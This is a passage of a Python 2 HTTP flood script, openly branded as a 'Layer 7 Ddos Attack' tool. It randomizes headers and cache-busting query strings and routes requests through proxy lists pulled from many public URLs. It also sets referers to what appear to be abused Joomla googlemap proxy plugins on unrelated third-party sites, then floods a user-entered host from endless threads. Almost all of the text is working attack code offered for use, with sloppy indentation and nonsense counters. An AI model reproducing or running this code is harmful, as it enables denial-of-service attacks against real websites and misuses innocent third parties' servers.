        headers_referers.append('http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        return(headers_referers )
    except MemoryError:
                print("[Root@Kali://P3terJ4mes>Memory not open specified Referers.\n")
    
def buildLock(size):
    out_str = ''
    _LOWERCASE = range(97, 122)
    _UPPERCASE = range(65, 90)
    _NUMERIC   = range(48, 57)
    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
    for i in range(0, size):
	code = random.choice(validChars)
	out_str += chr(code)
    return(out_str)

def noCache():
    #Random no-cache entries:
    noCacheDirectives = ['no-cache', 'max-age=0','s-maxage=0', 'no-store', 'must-revalidate','no-transform','proxy-revalidate','must-revalidate']
    random.shuffle(noCacheDirectives)
    nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
    noCache = ', '.join(noCacheDirectives[:nrNoCache])
    return(noCache)

def acceptCharset():
    #Random accept-charset:
    acceptCharset = ['ISO-8859-1','utf-8;q=0.7','*;q=0.7','Windows-1251','ISO-8859-2','ISO-8859-15', ]
    random.shuffle(acceptCharset)
    nrCharset = random.randint(1,(len(acceptCharset)-1))
    noCharset = ', '.join(acceptCharset[:nrCharset])
    return(noCharset)
   
def acceptEncoding():
    #Random accept encoding:
    acceptEncoding = ['\'\'','*','identity','gzip','deflate','compress','sdch']
    random.shuffle(acceptEncoding)
    nrEncodings = random.randint(1,len(acceptEncoding)/2)
    roundEncodings = acceptEncoding[:nrEncodings]
    return(roundEncodings)

def contentType():
    #Random Content-Type:
    contentType = ['multipart/form-data', 'application/x-url-encoded']
    random.shuffle(contentType)
    nrContentType = random.randint(1,len(contentType)/2)
    roundContentType = contentType[:nrContentType]
    return(roundContentType)

class Requested(threading.Thread):
    def run(self):
        referer_list()
        global Lock
        global headers
        global listaproxy
        global request_counter
        global Request_counter
        while Close == False:
            try:
                #Request Layer7 Attack:
                print("[Root@Kali://P3terJ4mes>---Connecting To Host ...[{0}]\n").format(url)
                request = urllib2.Request(url + "?" + buildLock(random.randint(3,10)))
                request.add_header("User-Agent", getUserAgent())
                request.add_header("Referer", random.choice(headers_referers) + url)
                request.add_header('Keep-Alive', random.randint(110,120))
	        request.add_header('Connection', 'keep-alive')
	        request.add_header('Cache-Control',random.choice(noCache()))
	        request.add_header('Accept-Charset', random.choice(acceptCharset()))
	        request.add_header('Accept-Encoding', random.choice(acceptEncoding()))
	        request.add_header('Content-Type',random.choice(contentType()))
	        index_proxy = random.randint(0,len(listaproxy)-1)
                proxy_server = urllib2.ProxyHandler({'http':listaproxy[index_proxy]})
                opener = urllib2.build_opener(proxy_server,urllib2.HTTPHandler)
                urllib2.install_opener(opener)
                urllib2.urlopen(request)
                request_counter += 1210
                Request_counter += 999999999999999999999999999999999999999999999999999999999999999999999999999999
                #Check Status-Codes:
                proxies = {'http':listaproxy[index_proxy]}
                headers = {'User-Agent': getUserAgent(),
			   'Referer': random.choice(headers_referers) + url,
                           'Accept-Charset': random.choice(acceptCharset()),
			   'Accept-Encoding': random.choice(acceptEncoding()),
                           'Content-Type':random.choice(contentType()),
			   'Cache-Control': random.choice(noCache()),
			   'Pragma': 'no-cache'}
                response = requests.get(url + "?" + buildLock(random.randint(3,10)),headers=headers,proxies=proxies,timeout=None)
                status_codes = response.status_code
                Lock.acquire()
                print("[Root@Kali://P3terJ4mes>Status to Responses in Server---> {}\n").format(status_codes)
                print("[Root@Kali://P3terJ4mes>Layer 7 Attack with Proxy [--{}--]\n ").format(listaproxy[index_proxy])
                print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(request_counter)
                print("[Root@Kali://P3terJ4mes>Requests Server {} stated !!!\n").format(Request_counter/5.0)
                Lock.release()
            except requests.exceptions.InvalidURL:
                print("[Root@Kali://P3terJ4mes>The proxy URL provided is invalid. !\n")
            except requests.exceptions.InvalidProxyURL:
                print("[Root@Kali://P3terJ4mes>Check Again the proxy URL provided.\n")
            except requests.exceptions.ChunkedEncodingError:
			pass
	    except requests.exceptions.ConnectionError:
			request_counter += 1210
	    except requests.exceptions.ReadTimeout:
			pass
            except httplib.InvalidURL:
                print("[Root@Kali://P3terJ4mes>Check Again the proxy URL provided.\n")
            except urllib2.HTTPError :
                print("[Root@Kali://P3terJ4mes>======SERVER MIGHT ME Down \n")
            except urllib2.HTTPError as e:
                print("[Root@Kali://P3terJ4mes>Status to ResponsesHTTPError in Server---> {}\n").format(e.code)
                pass
            except urllib2.URLError:
                print("[Root@Kali://P3terJ4mes>URL ERROR\n")
            except httplib.BadStatusLine:
                print("[Root@Kali://P3terJ4mes>Bad Status Line\n")
            except NameError:
                print("[Root@Kali://P3terJ4mes>List a ProxyHTTP is not define.\n")
            except IOError:
                print("[Root@Kali://P3terJ4mes>Could not open specified url.\n")
            except MemoryError:
                print("[Root@Kali://P3terJ4mes>Memory not open specified url.\n")
            except ValueError:
                print ("[Root@Kali://P3terJ4mes>Checking The URL\n")
            except KeyboardInterrupt:
                exit("[Root@Kali://P3terJ4mes>Canceled By P3terJ4mes\n")
        while Close == True:
              #Close Layer7 Attack:
              try:
                 print("[Root@Kali://P3terJ4mes>Done for Attack Layer7---2019 By P3terJ4mes !!!")
              except:
                 sys.exit(3)

 print("                      PROXY ---------Requests----------||||               ")
print("           Computer ========|           |               ==> HOST          ")
print("          +--------+      HTTP     Web Browser      :80 +----------+      ")
print("          | Client |  --------------------------------> |          |      ")
print("          |        |         Layer 7 Requests           | ProxyHTTP|      ")
print("          +--------+             +---------+            |==========|      ")
print("         /Requests/     HTTPS    |         | HTTPs Ports|__________|      ")
print("        <________/    ---------> | (Server | ---------> | Listening|      ")    
print("             \\      Status Server|  mode)  |            |          |     ")
print("              \\__| ==============|         | <----------| RESPONSE |     ")
print("                                 +---------+   Status   +----------+      ")
print("    !____________________________________________________________________!")

print(" =========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<=========")
print("")
print("")
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Code By Thunder(P3terJ4mes),Layer 7 Ddos Attack :::::........')
    os.system('color 0A')
    
url = raw_input('[Root@Kali://P3terJ4mes>Host :')
print("[Root@Kali://P3terJ4mes>Please Waiting for layer7 Requests !")
try:
   #The Proxy HTTP_HTTPS Update Every Time in The Site:
   in_file = urllib.urlopen('http://spys.me/proxy.txt')
   in_file1 = urllib.urlopen('http://www.proxylists.net/http.txt')
   in_file2 = urllib.urlopen('http://rootjazz.com/proxies/proxies.txt')
   in_file3 = urllib.urlopen('http://multiproxy.org/txt_anon/proxy.txt')
   in_file4 = urllib.urlopen('http://multiproxy.org/txt_all/proxy.txt')
   in_file5 = urllib.urlopen('http://www.proxylists.net/http_highanon.txt')
   in_file6 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=http')
   in_file7 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=https')
   in_file8 = urllib.urlopen('http://proxy-ip-list.com/download/free-proxy-list.txt')
   in_file10 = urllib.urlopen('https://rmccurdy.com/scripts/proxy/good.txt')
   in_file11 = urllib.urlopen('https://rmccurdy.com/scripts/proxy/proxylist.txt')
   in_file12 = urllib.urlopen('http://proxy-ip-list.com/download/free-usa-proxy-ip.txt')
   in_file13 = urllib.urlopen('http://proxy-ip-list.com/download/free-uk-proxy-list.txt')
   in_file14 = urllib.urlopen('http://proxy-ip-list.com/download/proxy-list-port-3128.txt')
   in_file15 = urllib.urlopen('http://cyber-hub.net/proxy/http.txt')
   listaproxy0 = in_file.readlines()  + in_file1.readlines()  + in_file2.readlines()  + in_file3.readlines()
   listaproxy1 = in_file4.readlines() + in_file5.readlines()  + in_file6.readlines()  + in_file7.readlines() 
   listaproxy3 = in_file12.readlines() + in_file13.readlines() + in_file14.readlines()+ in_file15.readlines()
   listaproxy2 = in_file8.readlines() + in_file10.readlines() + in_file11.readlines() 
   listaproxy = listaproxy0 + listaproxy1 + listaproxy2 + listaproxy3 
except IOError:
       print("[Root@Kali://P3terJ4mes>Could not open specified Proxy Url.\n")
    
while Close == False:
    try:
        Garena = Requested()
        Garena.start()
    except Exception:
        print("[Root@Kali://P3terJ4mes>Checking The Exceptions right now !!!\n")
    except KeyboardInterrupt:
        exit("[Root@Kali://P3terJ4mes>Canceled By P3terJ4mes")
